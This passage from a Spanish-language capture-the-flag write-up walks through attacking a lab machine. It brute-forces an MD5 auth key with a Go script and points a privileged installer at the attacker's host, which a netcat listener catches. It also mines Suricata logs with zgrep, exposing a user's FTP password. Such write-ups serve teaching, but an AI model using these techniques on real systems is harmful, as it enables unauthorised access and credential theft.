</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s>&#34;-a&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>&lt;</span> <span class=n>argc</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>strncpy</span><span class=p>(</span><span class=n>auth_key</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>],</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>auth_key</span><span class=p>));</span>
</span></span><span class=line><span class=cl>                <span class=n>auth_required</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Error: -a option requires an auth key.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>check_auth</span><span class=p>(</span><span class=n>auth_key</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Error: Authentication failed.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s>&#34;list&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>listPlaybooks</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s>&#34;run&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>playbookNumber</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>playbookNumber</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>DIR</span> <span class=o>*</span><span class=n>dir</span> <span class=o>=</span> <span class=nf>opendir</span><span class=p>(</span><span class=n>PLAYBOOK_LOCATION</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>dir</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;Failed to open the playbook directory&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=n>entry</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kt>int</span> <span class=n>currentPlaybookNumber</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kt>char</span> <span class=o>*</span><span class=n>playbookName</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=p>((</span><span class=n>entry</span> <span class=o>=</span> <span class=nf>readdir</span><span class=p>(</span><span class=n>dir</span><span class=p>))</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>entry</span><span class=o>-&gt;</span><span class=n>d_type</span> <span class=o>==</span> <span class=n>DT_REG</span> <span class=o>&amp;&amp;</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>entry</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>,</span> <span class=s>&#34;.yml&#34;</span><span class=p>)</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>currentPlaybookNumber</span> <span class=o>==</span> <span class=n>playbookNumber</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=n>playbookName</span> <span class=o>=</span> <span class=n>entry</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=n>currentPlaybookNumber</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nf>closedir</span><span class=p>(</span><span class=n>dir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>playbookName</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>runPlaybook</span><span class=p>(</span><span class=n>playbookName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Invalid playbook number.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Invalid playbook number.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s>&#34;install&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>installRole</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Usage2: %s [list|run playbook_number|install role_url] -a &lt;auth_key&gt;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Este script aparentemente compara el hash <code>MD5</code> con el argumento de la flag <code>-a</code> cuando el comando <code>install</code> es usado.</p><p>El comentario <code>#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"</code> define el hash <code>MD5</code> para autenticarse, el cual debe de ser igual al de la password/string <code>UHI75GHI****</code>. De manera que podemos tratar de encontrar este hash por fuerza bruta.
Dado que un script en <code>Python</code> podr√≠a ser muy lento para tratear de crackear un hash por fuerza bruta, decido crear un script en <code>Go</code> para hacerlo. El script es:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;crypto/md5&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;encoding/hex&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Calculate MD5 hash
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=nf>getMD5Hash</span><span class=p>(</span><span class=nx>text</span> <span class=kt>string</span><span class=p>)</span> <span class=kt>string</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>hash</span> <span class=o>:=</span> <span class=nx>md5</span><span class=p>.</span><span class=nf>Sum</span><span class=p>([]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>text</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>hex</span><span class=p>.</span><span class=nf>EncodeToString</span><span class=p>(</span><span class=nx>hash</span><span class=p>[:])</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Brute force MD5 hash
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=nf>bruteForceMatch</span><span class=p>(</span><span class=nx>pattern</span> <span class=kt>string</span><span class=p>,</span> <span class=nx>targetHash</span> <span class=kt>string</span><span class=p>,</span> <span class=nx>position</span> <span class=kt>int</span><span class=p>)</span> <span class=kt>string</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>charset</span> <span class=o>:=</span> <span class=s>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789|\\@#%&amp;/()=?_.,&#34;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>position</span> <span class=o>&gt;=</span> <span class=nb>len</span><span class=p>(</span><span class=nx>pattern</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nf>getMD5Hash</span><span class=p>(</span><span class=nx>pattern</span><span class=p>)</span> <span class=o>==</span> <span class=nx>targetHash</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=nx>pattern</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>pattern</span><span class=p>[</span><span class=nx>position</span><span class=p>]</span> <span class=o>!=</span> <span class=sc>&#39;*&#39;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nf>bruteForceMatch</span><span class=p>(</span><span class=nx>pattern</span><span class=p>,</span> <span class=nx>targetHash</span><span class=p>,</span> <span class=nx>position</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>char</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>charset</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>newPattern</span> <span class=o>:=</span> <span class=nx>pattern</span><span class=p>[:</span><span class=nx>position</span><span class=p>]</span> <span class=o>+</span> <span class=nb>string</span><span class=p>(</span><span class=nx>char</span><span class=p>)</span> <span class=o>+</span> <span class=nx>pattern</span><span class=p>[</span><span class=nx>position</span><span class=o>+</span><span class=mi>1</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>		<span class=nx>result</span> <span class=o>:=</span> <span class=nf>bruteForceMatch</span><span class=p>(</span><span class=nx>newPattern</span><span class=p>,</span> <span class=nx>targetHash</span><span class=p>,</span> <span class=nx>position</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=nx>result</span> <span class=o>!=</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=nx>result</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Main
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>targetHash</span> <span class=o>:=</span> <span class=s>&#34;0feda17076d793c2ef2870d7427ad4ed&#34;</span> <span class=c1>// Auth hash
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>pattern</span> <span class=o>:=</span> <span class=s>&#34;UHI75GHI****&#34;</span> <span class=c1>// String to find
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=nx>result</span> <span class=o>:=</span> <span class=nf>bruteForceMatch</span><span class=p>(</span><span class=nx>pattern</span><span class=p>,</span> <span class=nx>targetHash</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>result</span> <span class=o>!=</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Match found: %s\n&#34;</span><span class=p>,</span> <span class=nx>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;No match found.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Al correr este script, √©ste r√°pidamente nos retorna:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ go run main.go
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Match found: UHI75GHINKOP
</span></span></span></code></pre></div><p>De manera que tenemos un c√≥digo de autenticaci√≥n <code>UHI75GHINKOP</code>.</p><p>Decido revisar qu√© es lo que esta aplicaci√≥n trata de instalar cuando lo llamamos. Para ello, como ya es usual, empezamos un listener con <code>netcat</code> en el puerto <code>8000</code>. En la m√°quina v√≠ctima entonces ejecutamos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dev_acc@intuition:/tmp/temp$ ./runner1 install http://10.10.16.6:8000/ -a UHI75GHINKOP
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting galaxy role install process
</span></span></span><span class=line><span class=cl><span class=go>- downloading role from http://10.10.16.6:8000/
</span></span></span></code></pre></div><p>y en mi listener con <code>netcat</code> obtengo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 8000 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.15] 51002
</span></span></span><span class=line><span class=cl><span class=go>GET / HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=go>Accept-Encoding: identity
</span></span></span><span class=line><span class=cl><span class=go>Host: 10.10.16.6:8000
</span></span></span><span class=line><span class=cl><span class=go>User-Agent: ansible-galaxy/2.10.8 (Linux; python:3.11.0)
</span></span></span><span class=line><span class=cl><span class=go>Connection: close
</span></span></span></code></pre></div><p>De manera que <code>Ansible Galaxy</code> est√° tratando de instalar algo.</p><p><div class="notice note"><div class=notice-title><i class="fa-solid fa-sticky-note" aria-hidden=true></i>Nota</div><div class=notice-content><code>Ansible Galaxy</code> is a galaxy website where users can share roles and to a command-line tool for installing, creating, and managing roles. <code>Ansible Galaxy</code> gives greater visibility to one of Ansible&rsquo;s most exciting features, such as application installation or reusable roles for server configuration</div></div>B√°sicamente es una herramienta para compartir c√≥digo, la cual tambi√©n puede ser utilizada para configurar usuarios y roles.</p><p>Volviendo a revisar el output de <code>LinPEAS</code> tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Modified interesting files in the last 5mins (limit 100)
</span></span></span><span class=line><span class=cl><span class=go>/var/www/app/blueprints/auth/users.db
</span></span></span><span class=line><span class=cl><span class=go>/var/log/kern.log
</span></span></span><span class=line><span class=cl><span class=go>/var/log/auth.log
</span></span></span><span class=line><span class=cl><span class=go>/var/log/syslog
</span></span></span><span class=line><span class=cl><span class=go>/var/log/laurel/audit.log.8
</span></span></span><span class=line><span class=cl><span class=go>/var/log/laurel/audit.log.1
</span></span></span><span class=line><span class=cl><span class=go>/var/log/laurel/audit.log.3
</span></span></span><span class=line><span class=cl><span class=go>/var/log/laurel/audit.log.9
</span></span></span><span class=line><span class=cl><span class=go>/var/log/laurel/audit.log.5
</span></span></span><span class=line><span class=cl><span class=go>/var/log/laurel/audit.log.6
</span></span></span><span class=line><span class=cl><span class=go>/var/log/laurel/audit.log
</span></span></span><span class=line><span class=cl><span class=go>/var/log/laurel/audit.log.7
</span></span></span><span class=line><span class=cl><span class=go>/var/log/laurel/audit.log.4
</span></span></span><span class=line><span class=cl><span class=go>/var/log/laurel/audit.log.2
</span></span></span><span class=line><span class=cl><span class=go>/var/log/journal/ebecc789f6824e8caa134b39574ba839/system@b03da3a0958940309fbfcf7acfe4ac92-0000000000064aa6-0006197584a8f306.journal
</span></span></span><span class=line><span class=cl><span class=go>/var/log/journal/ebecc789f6824e8caa134b39574ba839/user-1001.journal
</span></span></span><span class=line><span class=cl><span class=go>/var/log/journal/ebecc789f6824e8caa134b39574ba839/system.journal
</span></span></span><span class=line><span class=cl><span class=go>/var/log/suricata/eve.json
</span></span></span><span class=line><span class=cl><span class=go>/var/log/suricata/stats.log
</span></span></span><span class=line><span class=cl><span class=go>/var/log/nginx/access.log
</span></span></span><span class=line><span class=cl><span class=go>/home/dev_acc/.gnupg/pubring.kbx
</span></span></span><span class=line><span class=cl><span class=go>/home/dev_acc/.gnupg/trustdb.gpg
</span></span></span><span class=line><span class=cl><span class=go>/home/dev_acc/snap/lxd/common/config/config.yml
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Puedo ver un servicio <code>Suricata</code> corriendo:</p><p><div class="notice note"><div class=notice-title><i class="fa-solid fa-sticky-note" aria-hidden=true></i>Nota</div><div class=notice-content><code>Suricata</code> is an open-source detection engine that can act as an intrusion detection system (IDS) and an intrusion prevention system (IPS). It was developed by the Open Information Security Foundation (OSIF) and is a free tool used by enterprises, small and large.</div></div>En resumen, <code>Suricata</code> es una herramienta para detectar intrusiones y analizar el tr√°fico dentro de la m√°quina.</p><p>Esto significa que este servicio podr√≠a contener usuarios y/o contrase√±as. Visitando <code>/var/log/suricata</code> puedo ver algunos archivos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dev_acc@intuition:~$ ls -la /var/log/suricata/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 127208
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 root root       4096 May 27 17:46 .
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x 12 root syslog     4096 May 27 17:46 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root   80670968 May 27 22:07 eve.json
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root   16630665 May 27 17:46 eve.json.1
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root    5760612 Oct 26  2023 eve.json.1-2024040114.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 Apr  8 14:19 eve.json.1-2024042213.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 Apr 22 13:26 eve.json.1-2024042918.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 Apr 29 18:27 eve.json.1-2024052717.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root     214743 Oct 28  2023 eve.json.5.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root    5050595 Oct 14  2023 eve.json.7.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root     972578 Sep 29  2023 eve.json.8.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 May 27 17:46 fast.log
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 May 27 17:46 fast.log.1
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 Oct 26  2023 fast.log.1-2024040114.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 Apr  8 14:19 fast.log.1-2024042213.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 Apr 22 13:26 fast.log.1-2024042918.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 Apr 29 18:27 fast.log.1-2024052717.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root         20 Oct 26  2023 fast.log.5.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root       1033 Oct  8  2023 fast.log.7.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root       1485 Sep 28  2023 fast.log.8.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root    8119002 May 27 22:07 stats.log
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root    7720141 May 27 17:46 stats.log.1
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root    4293890 Oct 26  2023 stats.log.1-2024040114.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 Apr  8 14:19 stats.log.1-2024042213.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 Apr 22 13:26 stats.log.1-2024042918.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root          0 Apr 29 18:27 stats.log.1-2024052717.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root      73561 Oct 28  2023 stats.log.5.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root     376680 Oct 14  2023 stats.log.7.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root      67778 Sep 29  2023 stats.log.8.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root       1218 May 27 17:46 suricata.log
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root      25296 May 27 17:46 suricata.log.1
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root       3893 Oct 26  2023 suricata.log.1-2024040114.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root      68355 Apr  8 14:19 suricata.log.1-2024042213.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root      95100 Apr 22 13:26 suricata.log.1-2024042918.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root      26145 Apr 29 18:27 suricata.log.1-2024052717.backup
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root        990 Apr  1 14:50 suricata.log.5.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root       1412 Oct 19  2023 suricata.log.7.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root root       5076 Oct  8  2023 suricata.log.8.gz
</span></span></span></code></pre></div><p>donde puedo ver algunos archivos <code>.log</code> y <code>.gz</code>.</p><p>Buscando por el usuario <code>lopez</code> con <code>grep</code> en este directorio retorna algo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dev_acc@intuition:~$ grep -i &#34;lopez&#34; /var/log/suricata/ 2&gt;/dev/null
</span></span></span></code></pre></div><p>Pero para ver mejor cu√°l es el match, podemos usar <code>zgrep</code> (el cual es <code>grep</code> para archivos comprimidos) y obtener as√≠:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dev_acc@intuition:~$ zgrep -i &#34;lopez&#34; /var/log/suricata/*.gz 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/var/log/suricata/eve.json.8.gz:{&#34;timestamp&#34;:&#34;2023-09-28T17:43:36.099184+0000&#34;,&#34;flow_id&#34;:1988487100549589,&#34;in_iface&#34;:&#34;ens33&#34;,&#34;event_type&#34;:&#34;ftp&#34;,&#34;src_ip&#34;:&#34;192.168.227.229&#34;,&#34;src_port&#34;:37522,&#34;dest_ip&#34;:&#34;192.168.227.13&#34;,&#34;dest_port&#34;:21,&#34;proto&#34;:&#34;TCP&#34;,&#34;tx_id&#34;:1,&#34;community_id&#34;:&#34;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&#34;,&#34;ftp&#34;:{&#34;command&#34;:&#34;USER&#34;,&#34;command_data&#34;:&#34;lopez&#34;,&#34;completion_code&#34;:[&#34;331&#34;],&#34;reply&#34;:[&#34;Username ok, send password.&#34;],&#34;reply_received&#34;:&#34;yes&#34;}}
</span></span></span><span class=line><span class=cl><span class=go>/var/log/suricata/eve.json.8.gz:{&#34;timestamp&#34;:&#34;2023-09-28T17:43:52.999165+0000&#34;,&#34;flow_id&#34;:1988487100549589,&#34;in_iface&#34;:&#34;ens33&#34;,&#34;event_type&#34;:&#34;ftp&#34;,&#34;src_ip&#34;:&#34;192.168.227.229&#34;,&#34;src_port&#34;:37522,&#34;dest_ip&#34;:&#34;192.168.227.13&#34;,&#34;dest_port&#34;:21,&#34;proto&#34;:&#34;TCP&#34;,&#34;tx_id&#34;:2,&#34;community_id&#34;:&#34;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&#34;,&#34;ftp&#34;:{&#34;command&#34;:&#34;PASS&#34;,&#34;command_data&#34;:&#34;Lopezzz1992%123&#34;,&#34;completion_code&#34;:[&#34;530&#34;],&#34;reply&#34;:[&#34;Authentication failed.&#34;],&#34;reply_received&#34;:&#34;yes&#34;}}
</span></span></span><span class=line><span class=cl><span class=go>/var/log/suricata/eve.json.8.gz:{&#34;timestamp&#34;:&#34;2023-09-28T17:44:32.133372+0000&#34;,&#34;flow_id&#34;:1218304978677234,&#34;in_iface&#34;:&#34;ens33&#34;,&#34;event_type&#34;:&#34;ftp&#34;,&#34;src_ip&#34;:&#34;192.168.227.229&#34;,&#34;src_port&#34;:45760,&#34;dest_ip&#34;:&#34;192.168.227.13&#34;,&#34;dest_port&#34;:21,&#34;proto&#34;:&#34;TCP&#34;,&#34;tx_id&#34;:1,&#34;community_id&#34;:&#34;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&#34;,&#34;ftp&#34;:{&#34;command&#34;:&#34;USER&#34;,&#34;command_data&#34;:&#34;lopez&#34;,&#34;completion_code&#34;:[&#34;331&#34;],&#34;reply&#34;:[&#34;Username ok, send password.&#34;],&#34;reply_received&#34;:&#34;yes&#34;}}
